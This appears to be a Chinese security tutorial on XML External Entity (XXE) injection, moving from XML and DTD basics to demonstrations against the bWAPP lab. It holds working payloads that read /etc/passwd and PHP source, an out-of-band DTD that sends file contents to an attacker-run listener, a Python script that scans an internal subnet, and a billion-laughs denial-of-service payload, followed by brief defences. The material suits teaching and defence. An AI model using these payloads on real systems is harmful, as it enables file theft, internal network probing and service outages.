> 原文链接: https://www.anquanke.com//post/id/197423 


# XXE从入门到放弃


                                阅读量   
                                **1307753**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t018543ef8b23734f4d.png)](https://p4.ssl.qhimg.com/t018543ef8b23734f4d.png)



## 认识XML和XXE

XXE全称XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，肯定要先了解XML语法规则和外部实体的定义及调用形式。

### XML基础知识

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

### XML语法规则如下：
<li>
**所有的XML****元素都必须有一个关闭标签**
</li>
<li>
**XML****标签对大小写敏感**
</li>
<li>
**XML****必须正确嵌套**
</li>
<li>
**XML****属性值必须加引号””**
</li>
<li>
**实体引用**        （在标签属性，以及对应的位置值可能会出现&lt;&gt;符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如&lt;傅好对应的实体就是lt，&gt;符号对应的实体就是gt）</li>
<li>
**在XML****中，空格会被保留**          （案例如：&lt;p&gt;a空格B&lt;/p&gt;，这时候a和B之间的空格就会被保留）</li>
```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;  //xml声明

&lt;!DOCTYPE copyright [        //DTD(文档类型定义)

&lt;!ELEMENT note (to,reset,login)&gt;   //定义元素

&lt;!ENTITY test SYSTEM "url"&gt;        //定义外部实体test

]&gt;

&lt;to&gt;

&lt;reset&gt;                    //下面为文档元素

  &lt;login&gt;&amp;test;&lt;/login&gt;            //调用test实体（此步骤不可缺）

  &lt;secret&gt;login&lt;/secret&gt;

&lt;/reset&gt;

&lt;to&gt;
```



### XML元素介绍

XML元素是指从（且包括）开始标签直到（且包括）结束标签的部分。

每个元素又有可以有对应的属性。XML属性必须加引号。

注意：
<li>
**XML****文档必须有一个根元素**
</li>
<li>
**XML****元素都必须有一个关闭标签**
</li>
<li>
**XML****标签对大小写敏感**
</li>
<li>
**XML****元素必须被正确的嵌套**
</li>
<li>
**XML****属性值必须加引号**
</li>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0141e553155d326986.png)

### XML DTD介绍

DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。

```
&lt;?xml version="1.0" encoding="utf-8" ?&gt; 

&lt;!DOCTYPE 学生名册 [

&lt;!ELEMENT 学生名册 (学生+)&gt; 

&lt;!ELEMENT 学生 (姓名,性别,年龄)&gt;

&lt;!ELEMENT 姓名 (#PCDATA)&gt; 

&lt;!ELEMENT 性别 (#PCDATA)&gt;

&lt;!ELEMENT 年龄 (#PCDATA)&gt; 

&lt;!ATTLIST 学生 学号 ID #REQUIRED&gt;

]&gt;

&lt;学生名册&gt;  

    &lt;学生 学号="a1"&gt;

&lt;姓名&gt;张三&lt;/姓名&gt;

&lt;性别&gt;男&lt;/性别&gt;

&lt;年龄&gt;20&lt;/年龄&gt;  

&lt;/学生&gt;

&lt;学生 学号="a2"&gt;

&lt;姓名&gt;李四&lt;/姓名&gt;

&lt;性别&gt;男&lt;/性别&gt;

&lt;年龄&gt;24&lt;/年龄&gt;

&lt;/学生&gt;

&lt;学生名册&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013637e2ad5fbd15af.png)

**DTD是什么？**

XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD文档类型定义（document type definition） 的东西控制的。

DTD用来描述xml文档的结构，一个DTD文档包含：

元素的定义规则；元素之间的关系规则；属性的定义规则。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

他就是长得下面这个样子：

**内部的 DOCTYPE 声明**

内部声明DTD类型

内部声明DTD类型声明：&lt;!DOCTYPE 根元素[子  元素声明]&gt;

```
&lt;!DOCTYPE 根元素[子   元素声明]&gt;



&lt;?xml version="1.0" encoding="UTF-8"?&gt;  //xml声明

&lt;!DOCTYPE note[        //DTD(文档类型定义)

&lt;!ELEMENT note (to,from,login)&gt;   //定义元素

&lt;!ELEMENT to (#PCDATA)&gt;

&lt;!ELEMENT from(#PCDATA)&gt;

&lt;!ELEMENT login (#PCDATA)&gt;        //定义外部实体test

]&gt;

&lt;note&gt;

&lt;to&gt;&lt;/to&gt;

&lt;from&gt;                    &lt;/from&gt;

&lt;login&gt;&amp;test;&lt;/login&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a3f1c9293bb748e8.png)

**引用外部实体：**

我们主要关注XML外部实体的定义和调用方式：

```
&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 

&lt;?xml version="1.0" encoding="gb2312"?&gt;

&lt;！DOCTYPE students SYSTEM "StudentDTD.dtd"&gt;

   &lt;students&gt;    

      &lt;student sno="_0010"&gt;        

         &lt;name&gt;Mark&lt;/name&gt;        

         &lt;age&gt;23&lt;/age&gt;        

         &lt;course&gt;English&lt;/course&gt;        

         &lt;course&gt;Math&lt;/course&gt;    

     &lt;/student&gt;    

     &lt;student sno="_0109" role="student"&gt;        

        &lt;name sex="Male"&gt;Andy&lt;/name&gt;        

        &lt;age&gt;19&lt;/age&gt;        

        &lt;course&gt;Chinese&lt;/course&gt;        

        &lt;school&gt;&amp;school;&lt;/school&gt;    

     &lt;/student&gt;

&lt;/students&gt;
```

**DTD数据类型**

PCDATA的意思是被解析的字符数据/

PCDATA的意思是被解析的字符数据，PCDATA是会被解析器解析的文本

CDATA的意思是字符数据

CDATA是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

**DTD****实体介绍**

（实体定义）

实体是用于定义引用普通文本或者特殊字符的快捷方式的变量

在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&amp;）开始，以字符（;）结束。

**内部实体：**

[![](https://p4.ssl.qhimg.com/t01b0b455cabdadf651.png)](https://p4.ssl.qhimg.com/t01b0b455cabdadf651.png)

```
&lt;!ENTITY 实体名称 "实体的值"&gt;
```

** 外部实体：**

[![](https://p0.ssl.qhimg.com/t01a5b9284363aff87d.png)](https://p0.ssl.qhimg.com/t01a5b9284363aff87d.png)

```
&lt;!ENTITY 实体名称 SYSTEM "URI/URL"&gt;
```

**外部参数实体：**

[![](https://p5.ssl.qhimg.com/t01755d18a3adf6383c.png)](https://p5.ssl.qhimg.com/t01755d18a3adf6383c.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0100ea0eca1a17f9ed.png)

```
&lt;!ENTITY % 实体名 "实体内容”&gt;
```

### XML注入产生的原理

XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

xxe漏洞触发的点往往是可以上传XML文件约位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。

**怎么判断网站是否存在XXE漏洞**

最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞，接下来，来看一个小小的展示：

这个是测试xxe的测试点：http://169.254.4.52/bWAPP/xxe-1.php

我们点击下面的Any bugs然后用burp抓包

[![](https://p2.ssl.qhimg.com/t013d3f93b406bdd0c2.png)](https://p2.ssl.qhimg.com/t013d3f93b406bdd0c2.png)

[![](https://p5.ssl.qhimg.com/t0152ded96395a4bd7a.png)](https://p5.ssl.qhimg.com/t0152ded96395a4bd7a.png)

我们随便输入下

[![](https://p0.ssl.qhimg.com/t01bd408199553153f8.png)](https://p0.ssl.qhimg.com/t01bd408199553153f8.png)

从上面我们可以看到，web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户。为了验证，我们可以构造如下的输入：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;

&lt;!DOCTYPE test[

&lt;!ENTITY test "testtest"&gt;]&gt;



&lt;reset&gt;&lt;login&gt;bee33333;&amp;test;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;
```

可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容？这个参数是可控的,我们可以做什么？

**XXE漏洞-文件读取**

PHP中测试POC

[File:///path/to/file.ext](File:///%5C%5Cpath%5Cto%5Cfile.ext)

[http://url/file.ext](http://url/file.ext)

PHP://filter/read=convert.base64-encode/resource=/home/bee/test.php

**读取文档**

**有回显的xxe利用**

Payload:

```
&lt;?xml version="1.0" encoding="utf-8" ?&gt;

&lt;!DOCTYPE xxe[

&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;

〈xxe&gt;&amp;xxe;&lt;/xxe&gt;
```

[![](https://p4.ssl.qhimg.com/t019332cba178af8e41.png)](https://p4.ssl.qhimg.com/t019332cba178af8e41.png)

**读取php文件**

直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，

直接利用file协议读取PHP文件，就会产生报错。那么需要base64编码来读取，

Payload：

```
&lt;?xml version="1.0" encoding="utf-8" ?&gt;

&lt;!DOCTYPE xxe[

&lt;!ENTITY xxe SYSTEM "PHP://filter/read=convert.base64-encode/resource=/home/bee/test.php"&gt;]&gt;
```

[![](https://p1.ssl.qhimg.com/t01b3b9e6918d232b4e.png)](https://p1.ssl.qhimg.com/t01b3b9e6918d232b4e.png)

进行解密后得到对应内容

[![](https://p5.ssl.qhimg.com/t013c9a24721133caea.png)](https://p5.ssl.qhimg.com/t013c9a24721133caea.png)

**本地测试无回显注入读取文件**

但是，在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据

先看一下漏洞示例：

[![](https://p5.ssl.qhimg.com/t01ebb323b6ce0d83c9.png)](https://p5.ssl.qhimg.com/t01ebb323b6ce0d83c9.png)

相较于前面有回显的漏洞代码，我们去掉了内容输出的一部分。这样，用之前的payload就没有作用了：

[![](https://p5.ssl.qhimg.com/t01e90789c7f7181b77.png)](https://p5.ssl.qhimg.com/t01e90789c7f7181b77.png)

Payload的构造：

有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：
1. 客户端发送payload 1给web服务器
1. web服务器向vps获取恶意DTD，并执行文件读取payload2
1. web服务器带着回显结果访问VPS上特定的FTP或者HTTP
1. 通过VPS获得回显（nc监听端口）
首先，我们使用ncat监听一个端口：

[![](https://p3.ssl.qhimg.com/t01b6e73839137cfe42.png)](https://p3.ssl.qhimg.com/t01b6e73839137cfe42.png)

也可以用python创建一个建议的http服务。

```
python -m SimpleHTTPServer 端口
```

然后，我们构造payload：

我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件：

```
&lt;!ENTITY % file SYSTEM “PHP://filter/read=convert.base64-encode/resource=/etc/passwd”&gt;

&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘监听的url+端口/?file;’&gt;”&gt;

%all;
```

[![](https://p4.ssl.qhimg.com/t014afb0a837226463c.png)](https://p4.ssl.qhimg.com/t014afb0a837226463c.png)

我们注意到，第一个参数实体的声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。

Payload如下：

```
&lt;?xml version=”1.0” encoding=”utf-8” ?&gt;

&lt;!DDOCTYPE root SYSTEM “dtd文件”&gt;

&lt;root&gt;&amp;send;&lt;/root&gt;
```

[![](https://p2.ssl.qhimg.com/t0177676f0a5d14e921.png)](https://p2.ssl.qhimg.com/t0177676f0a5d14e921.png)

如图，我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。

开始攻击：

[![](https://p1.ssl.qhimg.com/t0131ad37d141e60ca2.png)](https://p1.ssl.qhimg.com/t0131ad37d141e60ca2.png)

然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：

Ps：

有时候也会出现报错的情况（这是我们在漏洞的代码中没有屏蔽错误和警告），比如我们这里的payload没有选用php的base64编码，这里报错了，但是同时也将所读取的内容爆了出来，只是特殊字符经过了HTML实体编码。

[![](https://p0.ssl.qhimg.com/t010a307155613a9a92.png)](https://p0.ssl.qhimg.com/t010a307155613a9a92.png)

**内网探测**

xxe 由于可以访问外部 url，也就有类似 ssrf 的攻击效果，同样的，也可以利用 xxe 来进行内网探测。

可以先通过 file 协议读取一些配置文件来判断内网的配置以及规模，以便于编写脚本来探测内网。

一个 python 脚本实例：

```
import requests

import base64



#Origtional XML that the server accepts

#&lt;xml&gt;

#    &lt;stuff&gt;user&lt;/stuff&gt;

#&lt;/xml&gt;



def build_xml(string):

    xml = """&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""

    xml = xml + "\r\n" + """&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""

    xml = xml + "\r\n" + """&lt;!ENTITY xxe SYSTEM """ + '"' + string + '"' + """&gt;]&gt;"""

    xml = xml + "\r\n" + """&lt;xml&gt;"""

    xml = xml + "\r\n" + """    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""

    xml = xml + "\r\n" + """&lt;/xml&gt;"""

    send_xml(xml)

def send_xml(xml):

    headers = `{`'Content-Type': 'application/xml'`}`

    x = requests.post('http://127.0.0.1/xml.php', data=xml, headers=headers, timeout=5).text

    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value

    print coded_string

#   print base64.b64decode(coded_string)

for i in range(1, 255):

    try:

        i = str(i)

        ip = '192.168.1.' + i

        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'

        print string

        build_xml(string)

    except:

      print "error"

continue
```

运行起来大概是这样

[![](https://p3.ssl.qhimg.com/t01b73d8a77933b6911.png)](https://p3.ssl.qhimg.com/t01b73d8a77933b6911.png)

**DDOS攻击**

```
&lt;?xml version="1.0"?&gt;

&lt;!DOCTYPE lolz [

  &lt;!ENTITY lol "abc"&gt;

  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;

  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;

  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;

  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;

  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;

  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;

  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;

  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;

]&gt;

&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
```

该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。

### 影响:

此漏洞非常危险, 因为此漏洞会造成服务器上敏感数据的泄露，和潜在的服务器拒绝服务攻击。



## 防御方法：
1. 禁用外部实体
1. 过滤和验证用户提交的XML数据
1. 不允许XML中含有任何自己声明的DTD
1. 有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可
参考文章如下：

[https://www.cnblogs.com/backlion/p/9302528.html](https://www.cnblogs.com/backlion/p/9302528.html)

[https://www.freebuf.com/vuls/175451.htmls](https://www.freebuf.com/vuls/175451.htmls)

[https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw](https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw)

[https://www.freebuf.com/articles/web/97833.html](https://www.freebuf.com/articles/web/97833.html)

https://www.freebuf.com/articles/web/86007.html
